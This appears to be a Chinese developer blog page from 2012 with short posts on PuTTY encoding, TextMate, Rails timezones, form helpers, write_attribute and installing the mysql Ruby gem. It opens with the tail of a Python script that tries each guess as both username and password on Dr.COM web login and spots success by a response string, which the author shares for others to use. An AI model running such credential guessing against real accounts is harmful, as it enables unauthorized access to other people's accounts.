+</span><span class='line'>
+</span><span class='line'>while True:
+</span><span class='line'>for i in guess_list:
+</span><span class='line'>#drop last \n or \r
+</span><span class='line'>if type(i) == types.StringType:
+</span><span class='line'>i = i.rstrip('\n\r')
+</span><span class='line'>Logout()
+</span><span class='line'>print "Guess: " + str(i)
+</span><span class='line'>Login(i, i)
+</span><span class='line'>
+</span><span class='line'>if len(guess_list) == 0:
+</span><span class='line'>break
+</span><span class='line'>show_result()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga=&lsquo;error1'”字符串，当然严格来讲还得监测是不是有"Msg=0"这个字符串才好，我就省略了……</p>
+
+<p>希望被drcom困扰的人们都能拿去用用，希望对你们有帮助！</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/03/02/bad-chinese-encoding-in-putty/">Putty的中文乱码</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-03-02T12:08:00+08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2012</span></span> <span class='time'>12:08 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>着急回家就没带mbp，现在需要修改一下服务器上的文件，于是用了putty这款软件，一定要去官方下载啊，记得前一段时间爆发了在putty中嵌入木马从而盗取了N多服务器的root权限事件。</p>
+
+<p>不过在用的时候发现查看带有中文字符的文件会出现乱码，在这里得到了解决方案：</p>
+
+<ol>
+<li><p>打开putty主程序，选择window-〉Appearance-〉Font settings-〉Change…,选择Fixedsys字体,字符集选择CHINESEGB2312。</p></li>
+<li><p>在window-〉Appearance -〉Translation中，Received data assumed to be in which character set 中,把Use font encoding改为UTF-8如果经常使用,把这些设置保存在session里面.</p></li>
+<li><p>现在打开putty,登录成功后,在shell中输入:export LCALL=’zh_CN.utf8’</p></li>
+</ol>
+
+
+<p>然后再打开文件就没问题了。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/02/23/have-bought-textmate/">买了textmate</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-02-23T19:29:00+08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2012</span></span> <span class='time'>7:29 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>截至目前，这是我买得最贵的一款软件了——39欧元（327RMB）</p>
+
+<p>一直在豆瓣Textmate小组中等人家团购，自己也从没在官网试过购买，一看是用的paypal做中转，感觉不靠谱，以前也没试过paypal的支付，没想到这次成功了，先用了张信用卡支付，发现不行，结果换普通银行卡，直接跳转到了银联，然后我又用的信用卡透支……</p>
+
+<p>稍微配置了一下textmate，按照<a href="http://www.lixiaolai.com/archives/10895.html">这里</a>的方法，其中1.5版本的中文字体那里，建议不要尝试了，不完美，还是等2.0正式发布了吧，听说2.0对于中文字体支持得很好，但我懒得下载测试版来用：）</p>
+
+<p>加入GetBundles：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mkdir -p ~/Library/Application<span class="se">\ </span>Support/TextMate/Bundles
+</span><span class='line'><span class="nb">cd</span> !<span class="err">$</span>
+</span><span class='line'>svn co http://svn.textmate.org/trunk/Review/Bundles/GetBundles.tmbundle/
+</span><span class='line'>osascript -e <span class="s1">&#39;tell app &quot;TextMate&quot; to reload bundles&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>第一次见cd还能这样用，这样简直太方便了！还有最后那句script，多么优美的句子：）</p>
+
+<p>以后就要多用textmate了，先放弃emacs。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/02/15/set-timezone-in-rails/">设置Rails中的timezone</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-02-15T14:37:00+08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>2:37 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Timezone是很关键的东西哦，特别是某些app根据时间来作出不同反映的时候设置好Timezone就是必须的了。</p>
+
+<p>没设置之前，插入到数据库中的时间都是utc时间，晚8小时，修改两处就差不多正常了：）编辑config/application.rb，我用的是Rails3.2.1</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">config</span><span class="o">.</span><span class="n">active_record</span><span class="o">.</span><span class="n">default_timezone</span> <span class="o">=</span> <span class="ss">:local</span>
+</span><span class='line'><span class="n">config</span><span class="o">.</span><span class="n">time_zone</span> <span class="o">=</span> <span class="s1">&#39;Beijing&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>为何我说差不多呢，原因如下：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">001</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">Fpwd</span><span class="o">.</span><span class="n">store</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'> <span class="no">Fpwd</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">2</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="s2">&quot;fpwds&quot;</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="s2">&quot;fpwds&quot;</span> <span class="no">WHERE</span> <span class="s2">&quot;fpwds&quot;</span><span class="o">.</span><span class="s2">&quot;user_id&quot;</span> <span class="o">=</span> <span class="mi">1</span> <span class="no">LIMIT</span> <span class="mi">1</span>
+</span><span class='line'> <span class="no">SQL</span> <span class="p">(</span><span class="mi">2</span><span class="o">.</span><span class="mi">7</span><span class="n">ms</span><span class="p">)</span>  <span class="no">DELETE</span> <span class="no">FROM</span> <span class="s2">&quot;fpwds&quot;</span> <span class="no">WHERE</span> <span class="s2">&quot;fpwds&quot;</span><span class="o">.</span><span class="s2">&quot;user_id&quot;</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>  <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="n">ms</span><span class="p">)</span>  <span class="k">begin</span> <span class="n">transaction</span>
+</span><span class='line'><span class="no">Binary</span> <span class="n">data</span> <span class="n">inserted</span> <span class="k">for</span> <span class="sb">`string`</span> <span class="n">type</span> <span class="n">on</span> <span class="n">column</span> <span class="sb">`randstring`</span>
+</span><span class='line'> <span class="no">SQL</span> <span class="p">(</span><span class="mi">429</span><span class="o">.</span><span class="mi">6</span><span class="n">ms</span><span class="p">)</span>  <span class="no">INSERT</span> <span class="no">INTO</span> <span class="s2">&quot;fpwds&quot;</span> <span class="p">(</span><span class="s2">&quot;created_at&quot;</span><span class="p">,</span> <span class="s2">&quot;randstring&quot;</span><span class="p">,</span> <span class="s2">&quot;updated_at&quot;</span><span class="p">,</span> <span class="s2">&quot;user_id&quot;</span><span class="p">)</span> <span class="no">VALUES</span> <span class="p">(</span><span class="sc">?,</span> <span class="sc">?,</span> <span class="sc">?,</span> <span class="sc">?)</span>  <span class="o">[[</span><span class="s2">&quot;created_at&quot;</span><span class="p">,</span> <span class="no">Wed</span><span class="p">,</span> <span class="mi">15</span> <span class="no">Feb</span> <span class="mi">2012</span> <span class="mi">14</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">35</span> <span class="no">CST</span> <span class="o">+</span><span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="o">]</span><span class="p">,</span> <span class="o">[</span><span class="s2">&quot;randstring&quot;</span><span class="p">,</span> <span class="s2">&quot;87e685e0d2ab37143fae248083822ffea600f577&quot;</span><span class="o">]</span><span class="p">,</span> <span class="o">[</span><span class="s2">&quot;updated_at&quot;</span><span class="p">,</span> <span class="no">Wed</span><span class="p">,</span> <span class="mi">15</span> <span class="no">Feb</span> <span class="mi">2012</span> <span class="mi">14</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">35</span> <span class="no">CST</span> <span class="o">+</span><span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="o">]</span><span class="p">,</span> <span class="o">[</span><span class="s2">&quot;user_id&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="o">]]</span>
+</span><span class='line'>  <span class="p">(</span><span class="mi">1</span><span class="o">.</span><span class="mi">4</span><span class="n">ms</span><span class="p">)</span>  <span class="n">commit</span> <span class="n">transaction</span>
+</span><span class='line'><span class="o">=&lt;</span><span class="no">Fpwd</span> <span class="ss">user_id</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">randstring</span><span class="p">:</span> <span class="s2">&quot;87e685e0d2ab37143fae248083822ffea600f577&quot;</span><span class="p">,</span> <span class="ss">created_at</span><span class="p">:</span> <span class="s2">&quot;2012-02-15 06:29:35&quot;</span><span class="p">,</span> <span class="ss">updated_at</span><span class="p">:</span> <span class="s2">&quot;2012-02-15 06:29:35&quot;</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>最后的返回值那里还是晚了8小时，我用sqlite3查看的时候时间是正常的，所以这里怀疑是ruby的时间问题了，好在app中已经正常！</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/02/14/differentiate-form-for-and-form-tag/">分清form_for和form_tag</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-02-14T19:34:00+08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>7:34 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>两个都是做form的指令，form_for是用来和一个model一块用的时候使用，form_tag就是普通的form了，侧重传值什么的。当初用了form_for来做了个登陆界面，怎么都得不到username和password，原来是这样，必须如此引用才可以——params[:user][:username]，前面的:user是我给form_for的第一个参数，这个form的所有信息都得加[:user]这样的前缀才能得到了，让我十分痛苦（又加上是个2.14）</p>
+
+<p>使用form_tag后对于它的action不太会控制，所幸不写参数了，正好action指向本地址，省事儿！</p>
+
+<p>感谢<a href="http://blog.csdn.net/babylon_0049/article/details/4730763">这里</a>写的内容</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/02/14/write-attribute-in-ruby/">Ruby中的write_attribute</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-02-14T16:06:00+08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>4:06 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>有时候想修改一下自己的setter方法，于是会容易犯这样的一个错误：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">password</span><span class="o">=</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
+</span><span class='line'>   <span class="vi">@password</span> <span class="o">=</span> <span class="n">pwd</span>
+</span><span class='line'>   <span class="k">return</span> <span class="k">if</span> <span class="vi">@password</span><span class="o">.</span><span class="n">blank?</span>
+</span><span class='line'>   <span class="n">create_new_salt</span>
+</span><span class='line'>   <span class="nb">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">xxx</span>
+</span><span class='line'> <span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>最后那行使用了self.password= xxx，你有没有注意到我们这个方法就是password=，你在自己调用自己，如果有条件停止的话，那这叫递归，如果没有的话，这就是死循环喽，ruby可能会抛出一个stack too deep的错误（rails至少会这样说），此时需要一个magic！</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">write_attribute</span><span class="p">(</span><span class="ss">:password</span><span class="p">,</span> <span class="no">User</span><span class="o">.</span><span class="n">encrypted_password</span><span class="p">(</span><span class="nb">self</span><span class="o">.</span><span class="n">password</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">salt</span><span class="p">))</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>使用write_attribute(xxx,jjj)即可，意思就是把jjj赋值给xxx了，因为此时正好在定义xxx，所以不能用xxx = 这样的方法赋值。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/02/12/pain-rails/">痛苦的rails</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-02-12T22:03:00+08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>10:03 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>由于rails给我带来的痛苦，让我对ruby这门写着code for fun的语言产生了怀疑，真得有fun么？一开始就没有感觉，现在来看更是如此。</p>
+
+<p>rails是一个正在成长的框架，每一个小版本号的变动都可能会引入和废弃不少特性，而我又傻傻地在使用最新的rails（3.2.1），书上讲的都是rails2.2.2的内容，乍一看变动不应该太大啊，实际上并不是如此！！！</p>
+
+<p>对于一个新手来说，学习一个正在成长的框架是痛苦的：（</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/02/09/egg-ache-no-route-matches-say-hello/">蛋疼的No Route Matches “/say/hello”</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-02-09T23:01:00+08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>11:01 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>现在有些后悔买的那本书了，《web开发敏捷之道第三版》，那本书的代码使用的是rails2.2.2，真够2的，现在用的是3.2.1，作者说有不少代码已经更改了，但没想到会差得连我都能看出来，我只是个初学者啊！好在我还能稍稍应付自如，后面可能就会更加累了！</p>
+
+<p>一开始在helloworld部分就遇到一个问题，用rails generate controller say后根本不能自动添加一条routes，找了原作者的wiki更新发现这里已经需要自己修改routes的内容了，不过也好，消去一行注释即可：）</p>
+
+<p>感谢<a href="http://www.xiaoyangsheng.com/2011/02/routing-error-no-route-matches-sayhello/">这里</a></p>
+
+<p>如果还有谁遇到类似不兼容问题，请看<a href="http://pragprog.com/wikis/wiki/ChangesToRails">作者的wiki更新</a>吧，希望有帮助！</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/02/09/some-issue-when-installing-mysql-ruby-driver/">安装mysql的Ruby驱动遇到的问题</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-02-09T20:08:00+08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>8:08 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>dawncold@tianzhenmatoMacBook-Pro ~<span class="nv">$ </span>gem install mysql
+</span><span class='line'>Fetching: mysql-2.8.1.gem <span class="o">(</span>100%<span class="o">)</span>
+</span><span class='line'>Building native extensions.  This could take a <span class="k">while</span>...
+</span><span class='line'>ERROR:  Error installing mysql:
+</span><span class='line'>ERROR: Failed to build gem native extension.
+</span><span class='line'>
+</span><span class='line'>       /usr/local/Cellar/ruby/1.9.3-p0/bin/ruby extconf.rb
+</span><span class='line'>checking <span class="k">for</span> mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>checking <span class="k">for</span> main<span class="o">()</span> in -lm... yes
+</span><span class='line'>checking <span class="k">for</span> mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>checking <span class="k">for</span> main<span class="o">()</span> in -lz... yes
+</span><span class='line'>checking <span class="k">for</span> mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>checking <span class="k">for</span> main<span class="o">()</span> in -lsocket... no
+</span><span class='line'>checking <span class="k">for</span> mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>checking <span class="k">for</span> main<span class="o">()</span> in -lnsl... no
+</span><span class='line'>checking <span class="k">for</span> mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>checking <span class="k">for</span> main<span class="o">()</span> in -lmygcc... no
+</span><span class='line'>checking <span class="k">for</span> mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>*** extconf.rb failed ***
+</span><span class='line'>Could not create Makefile due to some reason, probably lack of
+</span><span class='line'>necessary libraries and/or headers.  Check the mkmf.log file <span class="k">for</span> more
+</span><span class='line'>details.  You may need configuration options.
+</span><span class='line'>
+</span><span class='line'>Provided configuration options:
+</span><span class='line'>--with-opt-dir
+</span><span class='line'>--without-opt-dir
+</span><span class='line'>--with-opt-include
+</span><span class='line'>--without-opt-include<span class="o">=</span><span class="k">${</span><span class="nv">opt</span><span class="p">-dir</span><span class="k">}</span>/include
+</span><span class='line'>--with-opt-lib
+</span><span class='line'>--without-opt-lib<span class="o">=</span><span class="k">${</span><span class="nv">opt</span><span class="p">-dir</span><span class="k">}</span>/lib
+</span><span class='line'>--with-make-prog
+</span><span class='line'>--without-make-prog
+</span><span class='line'>--srcdir<span class="o">=</span>.
+</span><span class='line'>--curdir
+</span><span class='line'>--ruby<span class="o">=</span>/usr/local/Cellar/ruby/1.9.3-p0/bin/ruby
+</span><span class='line'>--with-mysql-config
+</span><span class='line'>--without-mysql-config
+</span><span class='line'>--with-mysql-dir
+</span><span class='line'>--without-mysql-dir
+</span><span class='line'>--with-mysql-include
+</span><span class='line'>--without-mysql-include<span class="o">=</span><span class="k">${</span><span class="nv">mysql</span><span class="p">-dir</span><span class="k">}</span>/include
+</span><span class='line'>--with-mysql-lib
+</span><span class='line'>--without-mysql-lib<span class="o">=</span><span class="k">${</span><span class="nv">mysql</span><span class="p">-dir</span><span class="k">}</span>/lib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>--with-mlib
+</span><span class='line'>--without-mlib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>--with-zlib
+</span><span class='line'>--without-zlib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>--with-socketlib
+</span><span class='line'>--without-socketlib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>--with-nsllib
+</span><span class='line'>--without-nsllib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>--with-mygcclib
+</span><span class='line'>--without-mygcclib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Gem files will remain installed in /usr/local/Cellar/ruby/1.9.3-p0/lib/ruby/gems/1.9.1/gems/mysql-2.8.1 <span class="k">for</span> inspection.
+</span><span class='line'>Results logged to /usr/local/Cellar/ruby/1.9.3-p0/lib/ruby/gems/1.9.1/gems/mysql-2.8.1/ext/mysql_api/gem_make.out
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>是Mac平台，安装了MySQL5.5.20，搜索了一番，似乎是因为已经安装了mysql没有指定已安装的mysql路径出现的问题，于是指定一个过去：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gem install mysql -- --with-mysql-dir<span class="o">=</span>/usr/local/mysql
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>一开始的那两个“&ndash;”不能省略，而且发现参数中那个等号左右最好别带空格，我是代码习惯了等号周围加空格，在这里竟然会出错。</p>
+
+<p>我已经解决问题了，成功安装mysql的ruby驱动，如果仍然遇到问题，可以试试参考<a href="http://blog.bmn.name/2008/02/rails-gem-install-mysql-throws-error-extconfrb-failed/">这里</a>（同样感谢这里）。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/17">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/15">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/28/test/">Test</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/27/build-hybla-for-ubuntu-14-dot-04/">Build Hybla for Ubuntu 14.04</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/26/save-red-status-elasticsearch/">Save Red Status Elasticsearch</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/29/msa-thoughts/">MSA Thoughts</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/27/sort-and-uniq-count/">Sort and Uniq Count</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - dawncold -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'dawncoldtechblog';
+      
+        
+        var disqus_script = 'count.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
